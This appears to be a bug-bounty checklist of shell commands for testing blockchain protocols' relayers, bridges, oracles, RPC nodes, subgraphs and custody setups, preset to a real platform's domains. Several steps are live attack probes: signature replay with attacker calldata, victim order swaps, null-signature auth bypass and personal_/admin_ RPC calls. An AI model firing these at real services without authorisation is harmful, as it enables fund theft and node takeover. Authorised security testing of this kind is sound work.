# Infrastructure-Adjacent-to-SC Playbook — Mechanical Checklist

Hunt the off-chain infra that signs/relays/indexes/triggers SC transactions. Protocol audits contracts for $5M, audits ops for $50K — 100x ROI differential.

**Template findings:** Polymarket ClobAuth (#232 High, #197 $10K), 1inch F01 RPC ($50K HackenProof), KelpDAO/LayerZero $292M RPC poisoning.

**Variables:**
```bash
export PROTO="polymarket"
export BASE="polymarket.com"
export RPC="https://rpc.$BASE"
export RELAYER="https://clob.$BASE"
export API="https://api.$BASE"
```

**Time budget:** 4–12h per infra class. Bridges + relayers highest ROI.

---

## SECTION A — SURFACE INVENTORY (15 min)

### A1. Infra subdomains
```bash
subfinder -d "$BASE" -silent | grep -iE 'relay|bridge|oracle|indexer|subgraph|keeper|rpc|gateway|sequencer|batch|signer|mpc'
```

### A2. Docs scrape for architecture
```bash
curl -s "https://docs.$BASE" | grep -oiE 'relayer|gasless|meta.?tx|bridge|oracle|sequencer|batch.?poster|keeper|liquidator|indexer|subgraph|mpc|hot.?wallet' | sort -u
```

### A3. On-chain: who are the keepers/relayers/signers?
```bash
# Find protocol's main contract, look for ROLEs
cast call "$CONTRACT" "getRoleMemberCount(bytes32)(uint256)" \
  $(cast keccak "KEEPER_ROLE") --rpc-url "$ETH_RPC"
# Enumerate each
cast call "$CONTRACT" "getRoleMember(bytes32,uint256)(address)" \
  $(cast keccak "KEEPER_ROLE") 0 --rpc-url "$ETH_RPC"
```
**Save:** every keeper/relayer address. These are hot wallets (Rule 28).

---

## SECTION B — RELAYER / GASLESS META-TX (2h)

Polymarket ClobAuth pattern. The relayer's signature validation IS the auth.

### B1. Find the relayer endpoint
```bash
# Usually api/relay or relayer.proto.com
for p in /relay /relayer /submit /execute /forward /meta; do
  printf "%s\t" "$p"
  curl -s -X POST "$RELAYER$p" -H "Content-Type: application/json" -d '{}' -w "%{http_code}\n" | tail -1
done
```

### B2. Capture a valid request
```bash
# Sign a real order in the dApp + DevTools → copy as cURL → save to /tmp/valid.sh
# Extract payload schema
cat /tmp/valid.sh | grep -oE "'{.*}'" | jq '.'
```

### B3. Missing function binding
```bash
# Replace the target function/payload while keeping the signature
# If relayer doesn't include function selector in signed hash → attacker picks function
python3 <<'EOF'
import json
body = json.load(open('/tmp/valid.json'))
body['data'] = '0xATTACKER_CALLDATA'
# Re-post with original signature
EOF
curl -s -X POST "$RELAYER/submit" -d @/tmp/mutated.json -H "Content-Type: application/json"
```
**Hit when:** Accepted → function binding missing.

### B4. Recipient not signed
```bash
# Change recipient field, keep signature
# Most common relayer bug
```

### B5. Amount injection
```bash
# If amount comes from DB via order_id, swap order_id to victim's
curl -s -X POST "$RELAYER/submit" -H "Content-Type: application/json" \
  -d '{"order_id":"VICTIM_ORDER","signature":"MY_SIG"}'
```

### B6. Nonce replay
```bash
# Submit same signed payload twice
curl -s -X POST "$RELAYER/submit" -d @/tmp/valid.json -H "Content-Type: application/json"
curl -s -X POST "$RELAYER/submit" -d @/tmp/valid.json -H "Content-Type: application/json"
# Check on-chain: two executions?
```

### B7. Chain-id missing
```bash
# Inspect signed hash construction in SDK source (usually @protocol/sdk on GitHub)
# If chain-id not in hash → sig from L1 replays on L2
```

### B8. Null/type-confusion on auth headers (Polymarket ClobAuth class)
```bash
# Keep user_address valid, mutate signature / nonce / chain_id fields
for mut in 'null' '""' '{}' '0' '"0x0"'; do
  curl -s -X POST "$RELAYER/auth" -H "Content-Type: application/json" \
    -d "{\"user\":\"$VICTIM\",\"signature\":$mut,\"nonce\":1}" -w "%{http_code}\n" | tail -1
done
```

### B9. EIP-2771 `_msgSender()` spoofing
```bash
# If SC uses ERC2771Context, check `trustedForwarder` is an allowlist (not just single)
cast call "$CONTRACT" "trustedForwarder()(address)" --rpc-url "$ETH_RPC"
# If the relayer is compromised → any msgSender spoofable
```

---

## SECTION C — CROSS-CHAIN BRIDGES (4h)

Rule 23: validate source chain AND sender contract. Both.

### C1. Find the receive handler
```bash
# Common names
rg -n 'function\s+(lzReceive|execute|receiveMessage|_nonblockingLzReceive|receiveCommand)' "$CONTRACT_DIR"
```

### C2. Source chain + sender checks
```bash
# Inside the handler, grep for checks:
for f in $(rg -l 'lzReceive\|receiveMessage' "$CONTRACT_DIR"); do
  echo "=== $f ==="
  sed -n '/function lzReceive/,/^    }/p' "$f" | grep -E 'require|if\s*\(|trustedRemote|srcChainId|srcAddress|sender'
done
```
**Hit when:** Missing `srcChainId` check OR `srcAddress` check OR msg.sender not gated to bridge endpoint.

### C3. Trusted remote coverage (LayerZero)
```bash
# For each chain ID the protocol supports, is a trusted remote set?
for cid in 101 102 110 111 184 109; do  # eth, bsc, arb, op, base, polygon
  cast call "$CONTRACT" "trustedRemoteLookup(uint16)(bytes)" $cid --rpc-url "$ETH_RPC"
done
```
**Hit when:** One chain set, another unset but handler still processes = forgery vector.

### C4. Wormhole VAA validation
```bash
# Check: sig threshold, chain_id in VAA, emitter address match
grep -n 'verifyVM\|parseAndVerifyVM\|getCurrentGuardianSet' "$CONTRACT_DIR"
```

### C5. Nomad-class ghost message
```bash
# Bridge accepts a message hash the attacker computes to collide a zero-merkle-root
# Rare today but check: is there a default "accepted" state from uninitialized storage?
grep -n 'confirmAt\|acceptableRoot' "$CONTRACT_DIR"
```

### C6. Reorg exposure
```bash
# How many blocks until bridge finalizes? If < chain finality → double-spend window
grep -rn 'finalityBlocks\|minBlockConfirmations\|challengePeriod' "$CONTRACT_DIR"
```

### C7. Emitter spoofing (event-driven bridges)
```bash
# If bridge listens to events on chain A and fires on chain B, does listener validate event emitter?
# Check listener config (off-chain) — typically in a config.yaml or ts file
grep -rn 'emitter\|contractAddress\|allowedContracts' "$BRIDGE_DIR"
```

---

## SECTION D — ORACLES (2h)

### D1. Oracle type detection
```bash
# Chainlink push: AggregatorV3Interface
# Pyth pull: IPyth.updatePriceFeeds
# API3: IApi3ReaderProxy
# UMA: OptimisticOracleV3
# TWAP: observe(uint32[])
grep -rn 'AggregatorV3\|IPyth\|IApi3\|OptimisticOracle\|observe(' "$CONTRACT_DIR"
```

### D2. Staleness check presence
```bash
# For Chainlink: is updatedAt checked?
grep -A 10 'latestRoundData\(\)' "$CONTRACT_DIR" | grep -E 'updatedAt|block\.timestamp'
```
**Hit when:** No `require(block.timestamp - updatedAt < STALE_THRESHOLD)` check.

### D3. Price range / sanity
```bash
# Is returned price bounded? 0 / negative / 100x deviation handling?
grep -A 5 'latestRoundData\|getPrice\|getAnswer' "$CONTRACT_DIR" | grep -E 'require.*price|> 0|>= 0|MIN_PRICE|MAX_PRICE'
```

### D4. Pyth confidence interval usage
```bash
grep -rn 'conf\|confidence\|priceStruct\.conf' "$CONTRACT_DIR"
```
**Hit when:** Pyth used but confidence field ignored → wide spreads fly through.

### D5. Pull oracle update-then-read atomicity
```bash
# Pull oracle: user provides signed update. Can attacker update with stale price in same tx as liquidation?
grep -rn 'updatePriceFeeds\|updatePriceFeedsIfNecessary' "$CONTRACT_DIR"
```
**Hit when:** Liquidation reads price AFTER user-controlled update in same tx.

### D6. Operator key OPSEC (custom oracles)
```bash
# If protocol has own oracle pusher: find the signer
# Check: is it a single EOA? Hot wallet? On a VM with SSH exposed?
cast call "$ORACLE_CONTRACT" "owner()(address)" --rpc-url "$ETH_RPC"
# Check on-chain tx history for that addr — does it submit from same IP range?
```

---

## SECTION E — SEQUENCER / L2 RPC (30 min)

### E1. RPC namespace probe (Rule 26)
```bash
for m in \
  web3_clientVersion net_version \
  admin_peers admin_nodeInfo admin_startHTTP admin_addPeer \
  debug_traceTransaction debug_traceBlock debug_storageRangeAt debug_chaindbProperty \
  personal_listAccounts personal_unlockAccount personal_sendTransaction personal_importRawKey \
  miner_start miner_stop miner_setEtherbase \
  txpool_content txpool_status txpool_inspect \
  eth_sendTransaction eth_signTransaction eth_sign eth_accounts
do
  r=$(curl -s -X POST "$RPC" -H "Content-Type: application/json" \
    --max-time 5 \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"$m\",\"params\":[],\"id\":1}")
  echo "$m: $r" | head -c 200
  echo ""
done
```

### E2. Hit classification
| Method returns data | Severity |
|---------------------|----------|
| `admin_*` | Critical — node takeover |
| `personal_listAccounts` non-empty | Critical — key access |
| `eth_accounts` non-empty | Critical — unlocked signer |
| `debug_trace*` | High — state + MEV info |
| `txpool_content` | High — pre-broadcast MEV |
| `miner_*` on sequencer | Critical — block production |

### E3. Sequencer force-inclusion test
```bash
# If L2, is there a way to force-include a tx via L1 if sequencer censors?
grep -rn 'forceInclusion\|SequencerInbox\|Delayed' "$L2_CONTRACTS"
```
**Hit when:** No force-inclusion path → censorship = Critical (Primacy of Impact).

### E4. Sequencer batch poster key
```bash
# Who signs batches? Single key?
cast call "$SEQUENCER_INBOX" "batchPosters(address)(bool)" "$ADDR" --rpc-url "$L1_RPC"
```

---

## SECTION F — INDEXER / SUBGRAPH (1h)

### F1. Subgraph endpoint discovery
```bash
# Extract from frontend JS
curl -s "https://$APP" | grep -oE 'thegraph\.com/subgraphs/[a-z0-9/-]+|[a-z0-9-]+\.goldsky\.com/[a-z0-9/-]+' | head
```

### F2. Introspection + errors
```bash
SG="https://api.thegraph.com/subgraphs/name/$ORG/$NAME"
curl -s -X POST "$SG" -H "Content-Type: application/json" \
  -d '{"query":"{_meta{block{number timestamp} hasIndexingErrors deployment}}"}'
```
**Hit when:** `hasIndexingErrors: true` AND protocol UI reads from this subgraph → dashboard shows wrong balances.

### F3. Lag check
```bash
# Latest on-chain block vs subgraph block
CHAIN_BLOCK=$(cast block-number --rpc-url "$ETH_RPC")
SG_BLOCK=$(curl -s -X POST "$SG" -d '{"query":"{_meta{block{number}}}"}' -H "Content-Type: application/json" | jq -r '.data._meta.block.number')
echo "lag: $((CHAIN_BLOCK - SG_BLOCK)) blocks"
```
**Hit when:** Lag > 50 blocks persistently → time window for drift exploits.

### F4. State divergence
```bash
# Query subgraph for user balance, compare to on-chain
# Pick 5 random active users
USER="0x..."
SG_BAL=$(curl -s -X POST "$SG" -d "{\"query\":\"{user(id:\\\"$USER\\\"){balance}}\"}" | jq -r '.data.user.balance')
ON_CHAIN=$(cast call "$TOKEN" "balanceOf(address)(uint256)" "$USER" --rpc-url "$ETH_RPC")
echo "subgraph: $SG_BAL  on-chain: $ON_CHAIN"
```
**Hit when:** Diverges → which does the dApp trust?

---

## SECTION G — KEEPERS / BOTS (1h)

Rule 28: every keeper wallet = hot key = fund-at-risk.

### G1. Enumerate keeper addresses
```bash
# On-chain: getRoleMember for KEEPER_ROLE, LIQUIDATOR_ROLE, UPDATER_ROLE
# Off-chain: Gelato tasks, Chainlink Automation upkeeps, custom cron
```

### G2. Keeper balance
```bash
for k in "${KEEPERS[@]}"; do
  bal=$(cast balance "$k" --rpc-url "$ETH_RPC")
  echo "$k: $bal ETH"
done
```
**Hit when:** Any keeper has > significant ETH, and there's a way to waste it (G3).

### G3. Keeper gas-waste grief
```bash
# Find the function keeper calls. Can attacker cause it to revert after high gas usage?
# Classic: keeper calls liquidate(user), but user can frontrun with "heal" that makes liquidate revert
grep -rn 'function liquidate\|function harvest\|function settle' "$CONTRACT_DIR"
```

### G4. Keeper permissioned admin function
```bash
# Check roles granted to keeper
grep -rn 'onlyKeeper\|hasRole.*KEEPER' "$CONTRACT_DIR"
# For each protected function, is it actually ops-only, or does it grant power?
```
**Hit when:** Keeper has a function that should be admin-only.

### G5. Chainlink Automation upkeep
```bash
# Public upkeep registration → anyone can register a perf-breaking upkeep?
cast call "$AUTOMATION_REGISTRY" "getUpkeep(uint256)" "$UPKEEP_ID" --rpc-url "$ETH_RPC"
```

---

## SECTION H — MPC / CUSTODY (2h, if applicable)

### H1. Safe{Core} / Multisig audit
```bash
# Find Safe address
cast call "$PROTOCOL" "owner()(address)" --rpc-url "$ETH_RPC"
# Is it a Safe?
cast code "$SAFE" --rpc-url "$ETH_RPC" | head -c 20
# Signer threshold
cast call "$SAFE" "getThreshold()(uint256)" --rpc-url "$ETH_RPC"
cast call "$SAFE" "getOwners()(address[])" --rpc-url "$ETH_RPC"
```

### H2. Installed modules
```bash
# Modules can bypass threshold
cast call "$SAFE" "getModulesPaginated(address,uint256)(address[],address)" \
  "0x0000000000000000000000000000000000000001" 100 --rpc-url "$ETH_RPC"
```
**Hit when:** Unexpected module, or module contract itself has vulns (rug pull, upgrade key).

### H3. Guard contract
```bash
cast storage "$SAFE" 0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8 --rpc-url "$ETH_RPC"
# If set, fetch guard contract and audit
```

### H4. Fireblocks / external MPC webhook
```bash
# Find integration code in protocol backend
# Check: is webhook sig verified? API key stored where?
# If accessible: webhook replay = double-signing
```

---

## SECTION I — SUBMISSION CHECKLIST

- [ ] Architecture diagram showing component in fund flow
- [ ] Fund flow impact: $ estimate + on-chain state table at block N
- [ ] Chain proof (Rule 36): entry → vulnerable component → fund movement
- [ ] Weight card (Rule 37) if severity ≥ Low
- [ ] Recovery path analysis: governance timelock? Pause? Revocation?
- [ ] Classification note: "This is an infra-adjacent finding in {component}, affecting {SC} via {fund flow}"
- [ ] Rule 23 / 26 / 28 referenced if applicable

Run `~/arsenal/audit-lifecycle/bin/preflight-mechanical.sh` before submit.

---

## HIT PRIORITY

1. **Relayer auth bypass on fund-flow action** — Polymarket ClobAuth class → Critical/High
2. **Bridge source/sender validation missing** (Rule 23 fail) → Critical
3. **RPC admin_/personal_ exposed on sequencer** (Rule 26) → Critical
4. **Oracle stale price + no sanity check** → Critical (liquidation-trigger vector)
5. **Subgraph drift causing wrong balance shown** + user action gated → High
6. **Keeper role overreach** (keeper has admin fn) → High
7. **Safe module with vulns** / Guard fail-open → Critical
8. **Chain reorg gap in bridge finalization** → High/Critical depending on TVL
